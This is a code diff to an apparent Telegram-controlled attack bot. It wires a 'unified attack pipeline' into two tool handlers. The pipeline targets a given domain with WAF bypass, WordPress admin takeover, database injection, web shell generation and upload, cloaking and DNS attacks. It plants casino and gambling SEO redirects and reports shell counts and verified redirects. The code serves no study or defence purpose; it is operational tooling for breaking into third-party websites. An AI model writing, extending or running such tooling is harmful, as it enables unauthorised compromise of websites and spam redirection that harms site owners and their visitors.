@@ -1304,32 +1304,110 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
             aiReasoning: `Agentic session #${session.sessionId} started`,
           });
         } else {
-          // Full chain attack
-          const { runFullChain } = await import("./blackhat-engine");
+          // Full chain attack — uses REAL unified attack pipeline (scan + exploit + upload + verify)
+          const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
           const { pickRedirectUrl } = await import("./agentic-attack-engine");
           const redirectUrl = args.redirectUrl || await pickRedirectUrl();
-          const report = await runFullChain(targetDomain, redirectUrl);
-          const duration = Date.now() - startTime;
           
-          const successPhases = report.phases.filter((p: any) => p.status === "success" || p.summary?.includes("success"));
-          const fullChainSuccess = successPhases.length > 0 || report.totalPayloads > 0;
-          result = `⚔️ Full Attack Chain: ${targetDomain}\n` +
+          // Collect progress events for summary
+          const progressEvents: string[] = [];
+          let lastPhase = "";
+          
+          const pipelineResult = await runUnifiedAttackPipeline(
+            {
+              targetUrl: `https://${targetDomain}`,
+              redirectUrl,
+              seoKeywords: ["casino", "gambling", "slots"],
+              enableCloaking: true,
+              enableWafBypass: true,
+              enableAltUpload: true,
+              enableIndirectAttacks: true,
+              enableDnsAttacks: true,
+              enableConfigExploit: true,
+              enableWpAdminTakeover: true,
+              enableWpDbInjection: true,
+              enableAiCommander: true,
+              enableComprehensiveAttacks: true,
+              enablePostUpload: true,
+              userId: 1,
+              globalTimeout: 10 * 60 * 1000, // 10 minutes for Telegram
+            },
+            (event) => {
+              // Track phase transitions for summary
+              if (event.phase !== lastPhase) {
+                lastPhase = event.phase;
+                progressEvents.push(`${event.phase}: ${event.detail.substring(0, 80)}`);
+              }
+            },
+          );
+          
+          const duration = Date.now() - startTime;
+          const verifiedFiles = pipelineResult.uploadedFiles.filter(f => f.redirectWorks && f.redirectDestinationMatch);
+          const anyRedirectWorks = pipelineResult.uploadedFiles.some(f => f.redirectWorks);
+          const pipelineSuccess = pipelineResult.success || verifiedFiles.length > 0 || anyRedirectWorks;
+          
+          result = `⚔️ Unified Attack Pipeline: ${targetDomain}\n` +
             `Redirect to: ${redirectUrl}\n` +
-            `Phases ทั้งหมด: ${report.phases.length}\n` +
-            `Payloads: ${report.totalPayloads}\n\n` +
-            `ขั้นตอน:\n${report.phases.map((p: any) => `  ${p.phase}. ${p.name} — ${p.summary}`).join("\n")}\n\n` +
-            `สถานะ: ${fullChainSuccess ? "✅ สำเร็จบางส่วน" : "❌ ล้มเหลว"}\n` +
-            `⏱ โจมตีใช้เวลา ${formatDuration(duration)}`;
-          if (!fullChainSuccess) {
-            const phaseErrors = report.phases.map((p: any) => `${p.name}: ${p.summary || "no result"}`).join("; ");
-            result += `\n❌ รายละเอียด: ${phaseErrors}`;
+            `Shells สร้าง: ${pipelineResult.shellsGenerated}\n` +
+            `Upload attempts: ${pipelineResult.uploadAttempts}\n` +
+            `ไฟล์ที่ upload ได้: ${pipelineResult.uploadedFiles.length}\n` +
+            `Redirect ทำงานจริง: ${verifiedFiles.length}\n\n`;
+          
+          // Show verified redirect files
+          if (verifiedFiles.length > 0) {
+            result += `✅ Redirect สำเร็จ:\n`;
+            for (const f of verifiedFiles) {
+              result += `  ${f.url} → ${f.finalDestination} (${f.method})\n`;
+            }
+            result += `\n`;
           }
+          
+          // Show uploaded but unverified files
+          const unverified = pipelineResult.uploadedFiles.filter(f => !f.redirectWorks);
+          if (unverified.length > 0) {
+            result += `📁 Upload ได้แต่ redirect ยังไม่ทำงาน:\n`;
+            for (const f of unverified.slice(0, 5)) {
+              result += `  ${f.url} (${f.method}) — HTTP ${f.httpStatus}\n`;
+            }
+            result += `\n`;
+          }
+          
+          // Show shellless results
+          if (pipelineResult.shelllessResults && pipelineResult.shelllessResults.length > 0) {
+            const shelllessSuccess = pipelineResult.shelllessResults.filter(r => r.success);
+            if (shelllessSuccess.length > 0) {
+              result += `🔄 Shellless attacks สำเร็จ: ${shelllessSuccess.length}\n`;
+              for (const r of shelllessSuccess.slice(0, 3)) {
+                result += `  ${r.method}: ${r.detail?.substring(0, 60) || "success"}\n`;
+              }
+              result += `\n`;
+            }
+          }
+          
+          // Show AI decisions summary
+          if (pipelineResult.aiDecisions.length > 0) {
+            result += `🧠 AI Decisions: ${pipelineResult.aiDecisions.length}\n`;
+            for (const d of pipelineResult.aiDecisions.slice(0, 3)) {
+              result += `  ${d.substring(0, 80)}\n`;
+            }
+            result += `\n`;
+          }
+          
+          // Show errors summary
+          if (pipelineResult.errors.length > 0 && !pipelineSuccess) {
+            result += `❌ Errors: ${pipelineResult.errors.slice(0, 3).join(", ")}\n\n`;
+          }
+          
+          result += `สถานะ: ${pipelineSuccess ? "✅ สำเร็จ — redirect ทำงานจริง!" : "❌ ล้มเหลว — ไม่สามารถวาง redirect ได้"}\n` +
+            `⏱ โจมตีใช้เวลา ${formatDuration(duration)}`;
+          
           await saveAttackLog({
             targetDomain, method: "full_chain",
-            success: fullChainSuccess,
+            success: pipelineSuccess,
             durationMs: duration, redirectUrl,
-            aiReasoning: `${report.phases.length} phases, ${report.totalPayloads} payloads. ${report.phases.map((p: any) => `${p.name}: ${p.summary || p.payloads?.length + " payloads"}`).join("; ")}`,
-            errorMessage: !fullChainSuccess ? `Full chain failed: ${report.phases.map((p: any) => p.summary).join(", ")}` : undefined,
+            uploadedUrl: verifiedFiles[0]?.url || pipelineResult.uploadedFiles[0]?.url,
+            aiReasoning: `Pipeline: ${pipelineResult.shellsGenerated} shells, ${pipelineResult.uploadAttempts} attempts, ${pipelineResult.uploadedFiles.length} uploaded, ${verifiedFiles.length} verified. AI: ${pipelineResult.aiDecisions.slice(0, 2).join("; ")}`,
+            errorMessage: !pipelineSuccess ? `Pipeline failed: ${pipelineResult.errors.slice(0, 3).join(", ")}` : undefined,
           });
         }
         
@@ -3098,36 +3176,67 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       }
       
     } else if (method === "full_chain") {
-      // Full chain with per-phase progress
-      await updateProgress("Starting full chain", "running");
+      // Full chain — uses REAL unified attack pipeline (scan + exploit + upload + verify)
+      await updateProgress("Starting unified attack pipeline", "running");
       const s1 = Date.now();
       const { pickRedirectUrl } = await import("./agentic-attack-engine");
       const redirectUrl = await pickRedirectUrl();
       timings.push({ step: `Redirect URL selected`, ms: Date.now() - s1, ok: true });
       stepIndex++;
-      await updateProgress("Running full chain", "running");
+      await updateProgress("Running unified pipeline (scan + exploit + upload + verify)", "running");
       
-      // Run full chain
+      // Run REAL unified attack pipeline
       const s2 = Date.now();
-      const { runFullChain } = await import("./blackhat-engine");
-      const report = await runFullChain(domain, redirectUrl);
+      const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
+      let lastPhaseForProgress = "";
+      
+      const pipelineResult = await runUnifiedAttackPipeline(
+        {
+          targetUrl: `https://${domain}`,
+          redirectUrl,
+          seoKeywords: ["casino", "gambling", "slots"],
+          enableCloaking: true,
+          enableWafBypass: true,
+          enableAltUpload: true,
+          enableIndirectAttacks: true,
+          enableDnsAttacks: true,
+          enableConfigExploit: true,
+          enableWpAdminTakeover: true,
+          enableWpDbInjection: true,
+          enableAiCommander: true,
+          enableComprehensiveAttacks: true,
+          enablePostUpload: true,
+          userId: 1,
+          globalTimeout: 10 * 60 * 1000, // 10 minutes
+        },
+        async (event) => {
+          // Track phase transitions for progress updates
+          if (event.phase !== lastPhaseForProgress) {
+            lastPhaseForProgress = event.phase;
+            timings.push({
+              step: `${event.phase}: ${event.detail.substring(0, 60)}`,
+              ms: Date.now() - s2,
+              ok: !event.detail.includes("❌"),
+            });
+            stepIndex++;
+            try {
+              await updateProgress(event.detail.substring(0, 80), "running");
+            } catch { /* ignore progress update errors */ }
+          }
+        },
+      );
+      
       const chainMs = Date.now() - s2;
+      const verifiedFiles = pipelineResult.uploadedFiles.filter(f => f.redirectWorks && f.redirectDestinationMatch);
+      const anyRedirectWorks = pipelineResult.uploadedFiles.some(f => f.redirectWorks);
+      const fullChainSuccess = pipelineResult.success || verifiedFiles.length > 0 || anyRedirectWorks;
       
-      // Add each phase as a timing entry
-      for (const phase of report.phases) {
-        timings.push({
-          step: `P${phase.phase}: ${phase.name} (${phase.payloads.length} payloads)`,
-          ms: Math.round(chainMs / report.phases.length),
-          ok: phase.payloads.length > 0,
-        });
-        stepIndex++;
-        await updateProgress(phase.name, "running");
-      }
-      
-      // Final summary
-      const successPhases = report.phases.filter((p: any) => p.status === "success" || p.summary?.includes("success"));
-      const fullChainSuccess = successPhases.length > 0 || report.totalPayloads > 0;
-      timings.push({ step: `Total: ${report.totalPayloads} payloads`, ms: 0, ok: fullChainSuccess });
+      // Add final summary timing
+      timings.push({
+        step: `Pipeline: ${pipelineResult.shellsGenerated} shells, ${pipelineResult.uploadAttempts} attempts, ${verifiedFiles.length} verified`,
+        ms: chainMs,
+        ok: fullChainSuccess,
+      });
       stepIndex++;
       await updateProgress("Done", fullChainSuccess ? "done" : "failed");
       
@@ -3138,15 +3247,15 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         success: fullChainSuccess,
         durationMs: chainMs,
         redirectUrl,
-        aiReasoning: `${report.phases.length} phases, ${report.totalPayloads} payloads. ` +
-          report.phases.map((p: any) => `${p.name}: ${p.summary || p.payloads.length + " payloads"}`).join("; "),
-        errorMessage: !fullChainSuccess ? `Full chain failed: ${report.phases.map((p: any) => p.summary).join(", ")}` : undefined,
+        uploadedUrl: verifiedFiles[0]?.url || pipelineResult.uploadedFiles[0]?.url,
+        aiReasoning: `Unified Pipeline: ${pipelineResult.shellsGenerated} shells, ${pipelineResult.uploadAttempts} attempts, ${pipelineResult.uploadedFiles.length} uploaded, ${verifiedFiles.length} verified. AI: ${pipelineResult.aiDecisions.slice(0, 2).join("; ")}`,
+        errorMessage: !fullChainSuccess ? `Pipeline failed: ${pipelineResult.errors.slice(0, 3).join(", ")}` : undefined,
       });
       
       // Send alternative suggestions on failure
       if (!fullChainSuccess) {
         await sendAlternativeAttackSuggestions(config, chatId, domain, "full_chain", {
-          errorMessage: `Full chain: ${report.totalPayloads} payloads, no success`,
+          errorMessage: `Unified pipeline: ${pipelineResult.errors.slice(0, 2).join(", ") || "no redirect verified"}`,
         });
       }
       
